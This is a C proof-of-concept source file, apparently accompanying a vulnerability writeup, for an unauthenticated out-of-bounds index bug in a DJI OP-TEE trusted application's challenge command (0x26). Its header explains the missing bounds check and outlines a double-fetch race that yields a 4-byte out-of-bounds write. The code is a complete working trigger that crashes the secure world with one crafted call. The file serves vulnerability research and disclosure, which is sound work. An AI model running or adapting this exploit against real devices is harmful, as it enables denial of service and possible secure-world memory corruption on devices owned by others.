/*
 * Normal-world PoC for DJI OP-TEE TA e91c9402 — BUG 2 (writeup, High):
 * cmd 0x26 (ssd_get_challenge, FUN_00107804) — unauthenticated unchecked
 * 16-bit slot index -> secure-world OOB access (data-abort DoS) and, with a
 * double-fetch race, a 4-byte OOB write of TEE_GenerateRandom output.
 *
 *   gates: paramTypes == TEEC_MEMREF_TEMP_INOUT (7), param0.size == 0x4c
 *   index = *(uint16_t *)(param0.buffer + 2);          // 0..0xFFFF, never bounded
 *   lVar5 = ssd_info_ptr_array[index];                 // (1) OOB READ  @ 0x129c30+index*8
 *   ...                                                //     deref'd as a pointer -> data abort
 *   TEE_GenerateRandom(&ssd_nonce_array[index], 4);    // (2) OOB WRITE @ 0x129e60+index*4
 *
 * This reproducer takes the reliable single-shot path: a large index makes the
 * ssd_info_ptr_array[index] load itself fall outside the mapped secure region,
 * so the missing bounds check manifests immediately as a secure-world data
 * abort (the writeup's "trivial unauthenticated DoS"). No session auth, no
 * provisioning, no signed material — one OpenSession + one InvokeCommand.
 *
 * (The 4-byte OOB *write* into ssd_nonce_array additionally needs the double
 * fetch: pass a valid/provisioned index so the gate load succeeds, then flip
 * the index field from a second CA thread before the TEE_GenerateRandom
 * re-fetch. The single-shot DoS below is the deterministic trigger.)
 *
 *   make emulator ; ./poc [slot_index]      # default 0xFFFF
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

#define TA_UUID          "e91c9402-64a0-470f-88e7-bf5d3c606b6a"
#define CMD_GET_CHALLENGE 0x26
#define REQ_SIZE          0x4c        /* required param0.size for case 0x26 */
#define SSD_NUM_SLOTS     32
#define IDX_OFFSET        2           /* index = *(u16 *)(buffer + 2) */

static TEEC_Result trigger(TEEC_Session *session, uint16_t idx)
{
    uint8_t buf[REQ_SIZE];
    memset(buf, 0, sizeof(buf));
    buf[IDX_OFFSET]     = (uint8_t)(idx & 0xff);
    buf[IDX_OFFSET + 1] = (uint8_t)(idx >> 8);

    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_NONE,
                                     TEEC_NONE, TEEC_NONE);   /* == 7 */
    op.params[0].tmpref.buffer = buf;
    op.params[0].tmpref.size   = REQ_SIZE;

    printf("[*] InvokeCommand cmd=0x%x paramTypes=0x%lx size=0x%x slot_idx=%u (0x%x)\n",
           CMD_GET_CHALLENGE, (unsigned long)op.paramTypes, REQ_SIZE, idx, idx);
    if (idx >= SSD_NUM_SLOTS)
        printf("    -> OOB: ssd_info_ptr_array[%u] @ 0x%lx / ssd_nonce_array[%u] @ 0x%lx "
               "(array bound is %u)\n",
               idx, 0x129c30 + (long)idx * 8, idx, 0x129e60 + (long)idx * 4, SSD_NUM_SLOTS);

    uint32_t eo = 0;
    TEEC_Result res = TEEC_InvokeCommand_impl(session, CMD_GET_CHALLENGE, &op, &eo);
    printf("[*] InvokeCommand returned 0x%08x (err_origin 0x%x)\n", res, eo);
    return res;
}

int main(int argc, char **argv)
{
    uint16_t idx = 0xFFFF;
    if (argc > 1)
        idx = (uint16_t)strtoul(argv[1], NULL, 0);

    TEEC_UUID *uuid = optee_uuid(TA_UUID);
    TEEC_Context context;
    TEEC_Session session;
    uint32_t eo = 0;
    TEEC_Result res;

    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); return 1; }

    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC, NULL, NULL, &eo);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, eo);
        TEEC_FinalizeContext_impl(&context);
        return 1;
    }
    printf("[+] session opened to %s\n", TA_UUID);

    trigger(&session, idx);

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    printf("[+] done\n");
    return 0;
}
